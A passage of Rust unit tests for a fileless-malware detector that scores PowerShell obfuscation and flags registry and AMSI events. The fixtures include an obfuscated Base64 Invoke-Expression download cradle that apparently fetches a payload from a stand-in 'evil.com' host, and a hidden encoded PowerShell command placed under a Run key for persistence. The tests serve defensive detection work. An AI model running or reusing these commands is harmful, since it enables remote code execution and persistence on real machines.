        let obfuscated = "Invoke-Expression ([Convert]::FromBase64String('SQBmACgAJABlAG4AdgA6AEMASABBAEkATABJAE4ARwApAC0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAGUAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAHYAaWBsAC4AYwBvAG0ALwBwAGEAeQBhAGwAbwBhAGQALgBwAHMAMQAnACkA'))";
        let obf_score = detector.calculate_obfuscation_score(obfuscated);
        assert!(
            obf_score > 0.5,
            "Obfuscated text score {} should be > 0.5",
            obf_score
        );
    }

    #[test]
    fn test_analyze_registry_event_detects_suspicious_run_key() {
        let mut detector = FilelessDetector::new();
        let event = RegistryEvent {
            key_path: "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run".to_string(),
            value_name: Some("Updater".to_string()),
            value_data: Some(
                "powershell.exe -WindowStyle Hidden -enc SQBmACgA".to_string(),
            ),
            action: RegistryAction::Created,
            timestamp: Utc::now(),
        };

        let detections = detector.analyze_registry_event(&event);
        assert!(!detections.is_empty());

        let registry_detection = detections
            .iter()
            .find(|d| d.attack_type == FilelessAttackType::RegistryPayload);
        assert!(registry_detection.is_some());
        let det = registry_detection.unwrap();
        assert_eq!(det.severity, EventSeverity::Critical);
        assert!(det.confidence > 0.9);
    }

    #[test]
    fn test_analyze_amsi_event_detection() {
        let mut detector = FilelessDetector::new();
        let event = AmsiEvent {
            process_id: 600,
            scan_result: AmsiScanResult::Detected,
            content_hash: "abc123".to_string(),
            app_name: "powershell.exe".to_string(),
            content_name: "amsi_bypass_test.ps1".to_string(),
            timestamp: Utc::now(),
        };

        let detection = detector.analyze_amsi_event(event);
        assert!(detection.is_some());
        let det = detection.unwrap();
        assert_eq!(det.attack_type, FilelessAttackType::AmsiBypass);
        assert_eq!(det.severity, EventSeverity::High);
        assert_eq!(detector.detection_count(), 1);
    }

    #[test]
    fn test_analyze_amsi_event_clean() {
        let mut detector = FilelessDetector::new();
        let event = AmsiEvent {
            process_id: 700,
            scan_result: AmsiScanResult::Clean,
            content_hash: "def456".to_string(),
            app_name: "powershell.exe".to_string(),
            content_name: "clean_script.ps1".to_string(),
            timestamp: Utc::now(),
        };

        let detection = detector.analyze_amsi_event(event);
        assert!(detection.is_none());
        assert_eq!(detector.detection_count(), 0);
    }

    #[test]
    fn test_clear() {
        let mut detector = FilelessDetector::new();
        detector.analyze_script_block(100, "powershell.exe", "IEX something");
        assert!(detector.detection_count() > 0);

        detector.clear();
        assert_eq!(detector.detection_count(), 0);
        assert!(detector.script_blocks.is_empty());
        assert!(detector.amsi_events.is_empty());
        assert!(detector.detections.is_empty());
    }

    #[test]
    fn test_shannon_entropy() {
        let low_entropy = "aaaaaaaaaaaaaaaaaaaa";
        let high_entropy = "aB3xK9mZq2pL7wR4nJ";

        let low = calculate_shannon_entropy(low_entropy);
        let high = calculate_shannon_entropy(high_entropy);

        assert!(high > low, "High entropy string should score higher");
        assert!(low < 2.0, "Low entropy should be < 2.0, got {}", low);
        assert!(high > 2.0, "High entropy should be > 2.0, got {}", high);
    }

    #[test]
    fn test_with_config() {
        let config = FilelessConfig {
            detect_powershell_attacks: false,
            obfuscation_threshold: 0.9,
            ..Default::default()
        };
        let detector = FilelessDetector::with_config(config);
        assert!(!detector.config.detect_powershell_attacks);
        assert!((detector.config.obfuscation_threshold - 0.9).abs() < f64::EPSILON);
    }
}
